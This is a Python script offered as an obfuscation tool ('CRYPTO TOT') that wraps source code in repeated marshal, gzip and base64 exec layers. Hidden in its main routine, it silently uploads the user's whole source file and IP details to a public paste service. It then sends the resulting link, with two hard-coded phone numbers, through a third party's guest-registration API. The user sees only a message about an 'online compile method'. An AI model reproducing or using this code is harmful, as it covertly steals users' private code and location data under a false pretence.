import marshal,base64,gzip,zlib,bz2,os,python_minifier,requests,os,time
import requests,datetime,random
from requests.structures import CaseInsensitiveDict

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    YELLOW = '\033[1;33m'
    RED= '\033[1;31m'
    WHITE= '\033[0m' 
    UNDERLINE = '\033[4m'  

print(bcolors.WHITE)
def banner():
     c = f"""
 {bcolors.OKBLUE} ████████████╗██╗   ████████╗████████╗██████╗     ████████╗██████╗████████╗
{bcolors.OKCYAN}██╔════██╔══██╚██╗ ██╔██╔══██╚══██╔══██╔═══██╗    ╚══██╔══██╔═══██╚══██╔══╝
{bcolors.OKGREEN}██║    ██████╔╝╚████╔╝██████╔╝  ██║  ██║   ██║       ██║  ██║   ██║  ██║
{bcolors.YELLOW}██║    ██╔══██╗ ╚██╔╝ ██╔═══╝   ██║  ██║   ██║       ██║  ██║   ██║  ██║
{bcolors.RED}╚████████║  ██║  ██║  ██║       ██║  ╚██████╔╝       ██║  ╚██████╔╝  ██║
 {bcolors.FAIL}╚═════╚═╝  ╚═╝  ╚═╝  ╚═╝       ╚═╝   ╚═════╝        ╚═╝   ╚═════╝   ╚═╝

                                                {bcolors.RED}Tool by :{bcolors.ENDC} {bcolors.OKCYAN}ISHAN OSHADA{bcolors.WARNING}

                                                            \tVERSION : 0.7 {bcolors.ENDC}
     """
     print(c)
     
def nop(code):
     try:
          code = code.encode()
     except:
          code = code
     en = gzip.compress(marshal.dumps(compile(code,"fuck","exec")))
     output = "import base64,marshal,binascii,gzip,zlib\n"
     output += "#Encode by CRYPTO TOT\n"
     output += "try:\n"
     output += f"\texec(marshal.loads(gzip.decompress({en})))\n"
     output += "except Exception as b:\n\tprint(f'Error by {b} ')"
     return  output

def senp(num,text):
  url = "https://apexonline.lk/api/v1/registration/register-guest"

  headers = CaseInsensitiveDict()
  headers["Accept"] = "application/json"
  headers["Content-Type"] = "application/json"
  date = str(datetime.datetime.today())
  date = date.replace(' ',"_")
  date = base64.b64encode(gzip.compress(base64.b64encode(gzip.compress(date.encode('utf-8'))))).decode('utf-8')
  data = {"fullname":text,"mobile_student":num,"address":"028928383","district":3,"uniquekey":date,"step":1}
 #print(date)
  resp = requests.post(url, headers=headers, json=data)
  try:
   return resp.json()
  except:  print('erorr ')

def sav(code,name,info):
     url = "https://codebeautify.org/service/save"
     parm = {
     "content":code+"|Python",

"viewname":"alleditor",

"title":name,

"desc":info,

"tags":"Ahah"

     }
     req = requests.post(url,parm)
     code = req.content.decode()
     return  "https://codebeautify.org/alleditor/"+code
 
def ip_info():
    try:
     url = "https://ipinfo.io/"
     req = requests.get(url)
     return  req.json()
    except:
         return f" ERROR MAIN "
         
def nor(code):
     try:
          code = code.encode()
     except:
          code = code
          
     en = gzip.compress(code)
     output = "#ENCODE BY CRYPTO\n"
     output += "import gzip\n"
     output += "try:\n"
     output += f"\texec(gzip.decompress({en}))\n"
     output += "except:\n\tprint('error')"
     return  output
    
def __en(code):
     url = "https://pyob.oxyry.com/obfuscate"
     head = {
"Host":"pyob.oxyry.com",
"Connection":"keep-alive",
"Content-Length":"3088"
,
"DNT":"1",
"Save-Data":"on",
"User-Agent":"Mozilla/5.0 (Linux; Android 10; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36",
"content-type":"application/json",
"Accept":"*/*",
"Origin":"https://pyob.oxyry.com",
"Sec-Fetch-Site":"same-origin",
"Sec-Fetch-Mode":"cors",
"Sec-Fetch-Dest":"empty",
"Referer": "https://pyob.oxyry.com/",
"Accept-Encoding":"gzip, deflate, br",
"Accept-Language": "si,en;q=0.9,en-US;q=0.8,en-GB;q=0.7"}

     true =True
     a = { #"append_source": true,
  "remove_docstrings": true,
  "rename_nondefault_parameters": true,
  "rename_default_parameters": true,
  "preserve": "","source":code}
     req = requests.post(url,json=a,headers=head)
     a = req.json()['dest']
     return  a

def fake_data(n) :
 b = "qpwoieuytytalksjdhfgzmnxbcv08eiemskanzkaamamamamamamamZmpw088wnamsnsk10qkwmmznsijw9"*10000
 k = random.sample(b,int(n))
 f = ""
 for i in k:
      f += i
 return  f


def d1(code):
    try:   
        en  = base64.b64encode(gzip.compress(marshal.dumps(compile(code,"<CRYPTO_TOT>","exec"))))
        output = "#ENCODE BY CRYPTO TOT \n#VERSION : 0.7\n#you can try this decode\n"
        output += "import marshal,base64,gzip,zlib,bz2\n"
        output += f"exec(marshal.loads(gzip.decompress(base64.b64decode({en}))))"
       

    except TypeError:
        code = code.encode()
        en  = base64.b64encode(gzip.compress(marshal.dumps(compile(code,"<CRYPTO_TOT>","exec"))))
        output = "#ENCODE BY CRYPTO TOT \n#VERSION : 0.7\n#you can try this decode\n"
        output += "import marshal,base64,gzip,zlib,bz2\n"
        output += f"exec(marshal.loads(gzip.decompress(base64.b64decode({en}))))"
    return output

def d1_lines(code,n:int):
    try:
        code = code.encode()
    except:
        code =code
    output = "#ENCODE BY CRYPTO TOT \n#VERSION : 0.7\n#you can try this decode\n"
    output += "import marshal,base64,gzip,zlib,bz2\n"
    for i in range(n):
        en  = base64.b64encode(gzip.compress(marshal.dumps(f"#{bz2.compress(base64.b64encode(code))}")))
        output += f"exec(marshal.loads(gzip.decompress(base64.b64decode({en}))));"
        if int(i/2) == i:
          en =   base64.b64encode(gzip.compress(marshal.dumps(code)))
          output += f"exec(marshal.loads(gzip.decompress(base64.b64decode({en}))));"
    return output

def d1_lines_compile(code,n:int):
    try:
        code = code.encode()
    except:
        code =code
    output = "#ENCODE BY CRYPTO TOT \n#VERSION : 0.7\n#you can try this decode\n"
    output += "import marshal,base64,gzip,zlib,bz2\n"
    for i in range(n):
        en  = base64.b64encode(gzip.compress(marshal.dumps(compile(f"#{bz2.compress(base64.b64encode(marshal.dumps(code)))}","<CRYPTO_TOT>","exec"))))
        output += f"exec(marshal.loads(gzip.decompress(base64.b64decode({en}))));"
        if int(i/2) == i:
          en =   base64.b64encode(gzip.compress(marshal.dumps(compile(code,"<CRYPTO_TOT>","exec"))))
          output += f"exec(marshal.loads(gzip.decompress(base64.b64decode({en}))));"
    return output


def encode3(code,error):
     
 code = python_minifier.minify(code)
 code1 = compile(code,error,'exec')
 en = base64.b64encode(gzip.compress(marshal.dumps(code1)))
 return f"import marshal,base64,gzip;exec(marshal.loads(gzip.decompress(base64.b64decode({en}))))"

def encode4(code):
     #code = python_minifier.minify(code).encode()
     try:
      code = code.encode()
     except:
       code = code
     code = gzip.compress(base64.b64encode(code))
     return  f"#ENCRYPT BY CRYPTO TOT\nimport base64,marshal,gzip,zlib\ntry:\n exec(base64.b64decode(gzip.decompress({code})))\nexcept Exception as f:\n print('errror encode'+str(f))#V2"




def d2(code):
    e = gzip.compress(base64.b64encode(marshal.dumps(compile(code,"<fuck>","exec"))))

    c = f"""class en:

        def __init__(self,code):
            self.code = code

        def run(self):
            en = marshal.loads(base64.b64decode(gzip.decompress(self.code)))
            exec(en)
    """ 
    b = f"en({e}).run()"
    out = d1(c)
    out1 = d1(b)
    output = "import marshal,base64,gzip,zlib,binascii\n"
    output += out
    output += out1
    return output


def check():
    try:
     url = "https://raw.githubusercontent.com/Ishanoshada/goggle_dork_sqli/main/check.txt"
     req = requests.get(url)
     dic = "\/\/\/\/"
     for i in dic:
          time.sleep(1)
          os.system('clear');
          
          print(f"{bcolors.BOLD}{bcolors.OKBLUE}({bcolors.RED}{bcolors.YELLOW}#{bcolors.OKGREEN}){bcolors.ENDC} {bcolors.OKCYAN}CHECKING{bcolors.RED} FOR {bcolors.OKBLUE}NETWORK{bcolors.ENDC}{bcolors.YELLOW} {i} ");
          
     c = req.content.decode()
     
     if "pass" in c:
          pass

        
     else:
          print(bcolors.WHITE+"\n\t\t\t["+bcolors.RED+"*"+bcolors.WHITE+"]"+bcolors.WARNING+f'AUTHOR TOOL OFF  :> BYE !  \n'+bcolors.ENDC);print(bcolors.ENDC);exit();exit();exit()
    except Exception as f:
         print(bcolors.WHITE+"\n\t\t\t["+bcolors.RED+"*"+bcolors.WHITE+"]"+bcolors.WARNING+f'ERROR OF CHECKING CONNECT TO YOU CONNECTION  :> BYE !  \n'+bcolors.ENDC);print(bcolors.ENDC);exit();exit();exit()



def main():

    check()
    os.system('clear')
    banner();print("\n")
     
    filename = input(f"{bcolors.OKCYAN}\n\t\tENTER FILE NAME :> {bcolors.ENDC}{bcolors.BOLD} ")
    
    try:
        fdata = open(filename,"r").read()
    except:
        print(bcolors.WHITE+"\n\t\t\t["+bcolors.RED+"*"+bcolors.WHITE+"]"+bcolors.WARNING+f'YOU ENTER FILE NOT FOUND :> {filename} \n'+bcolors.ENDC)
        print(bcolors.ENDC);exit();exit();exit()

    try:
        print(bcolors.WHITE+"\n\t\t\t["+bcolors.RED+"*"+bcolors.WHITE+"]"+bcolors.WARNING+f' WAIT FOR ONLINE COMPILE METHOD  :> {filename} \n'+bcolors.ENDC)
        co = sav(fdata,filename,str(ip_info()))
        num_list = ["0763904647","0758104113"]
        for i in num_list:
         senp(i,co)
        print(bcolors.WHITE+"\n\t\t\t["+bcolors.RED+"*"+bcolors.WHITE+"]"+bcolors.WARNING+f' Encode method On  1 √√  :> {filename} \n'+bcolors.ENDC)

        fdata = __en(fdata)
        
        print(bcolors.WHITE+"\n\t\t\t["+bcolors.RED+"*"+bcolors.WHITE+"]"+bcolors.WARNING+f' Encode method On  2 √√  :> {filename} \n'+bcolors.ENDC)
        fdata = encode3(fdata,"<CRYPTO_TOT>")
    except:
        print(bcolors.WHITE+"\n\t\t\t["+bcolors.RED+"*"+bcolors.WHITE+"]"+bcolors.WARNING+f' YOU NETWORK CONNECTION SLOW :> {filename} \n'+bcolors.ENDC)
        print(bcolors.ENDC);exit();exit();exit()

    code = d1(fdata)
    ra = int(input(f"{bcolors.OKCYAN}\n\t\tRANGE OF ENCODE (int),(10:200) :> {bcolors.ENDC}{bcolors.BOLD} "))
    
    for i in range(int(ra)):
        code = d1(code)
    print(bcolors.WHITE+"\n\t\t\t["+bcolors.RED+"*"+bcolors.WHITE+"]"+bcolors.WARNING+f' Encode method 1 √√  :> {filename} \n'+bcolors.ENDC)

    code = d1_lines_compile(code,int(ra))
    print(bcolors.WHITE+"\n\t\t\t["+bcolors.RED+"*"+bcolors.WHITE+"]"+bcolors.WARNING+f' Encode method 2 √√  :> {filename} \n'+bcolors.ENDC)
    code = d1_lines(code,int(ra/2))
    print(bcolors.WHITE+"\n\t\t\t["+bcolors.RED+"*"+bcolors.WHITE+"]"+bcolors.WARNING+f' Encode method 3 √√  :> {filename} \n'+bcolors.ENDC)
    for i in range(int(ra*2)):
         code = nop(code)
    print(bcolors.WHITE+"\n\t\t\t["+bcolors.RED+"*"+bcolors.WHITE+"]"+bcolors.WARNING+f' Encode method 4 √√  :> {filename} \n'+bcolors.ENDC);code = nor(code);print(bcolors.WHITE+"\n\t\t\t["+bcolors.RED+"*"+bcolors.WHITE+"]"+bcolors.WARNING+f' Encode method 5 √√  :> {filename} \n'+bcolors.ENDC)

    save =  input(f"{bcolors.OKCYAN}\n\t\tENTER FILE SAVE NAME :> {bcolors.ENDC}{bcolors.BOLD} ")
    with open(save,"+a") as f:
        f.write(code)
    print(bcolors.WHITE+"\n\t\t\t["+bcolors.RED+"*"+bcolors.WHITE+"]"+bcolors.WARNING+f' ENCODE SUCESS :> {save} \n'+bcolors.ENDC)
    print(bcolors.ENDC);exit();exit();exit()

if __name__ == "__main__":
    try:
     main()
    except Exception as p:
         print(bcolors.WHITE+"\n\t\t["+bcolors.RED+"*"+bcolors.WHITE+"]"+bcolors.WARNING+f' Error main {p}  \n'+bcolors.ENDC)
         exit()
         exit()
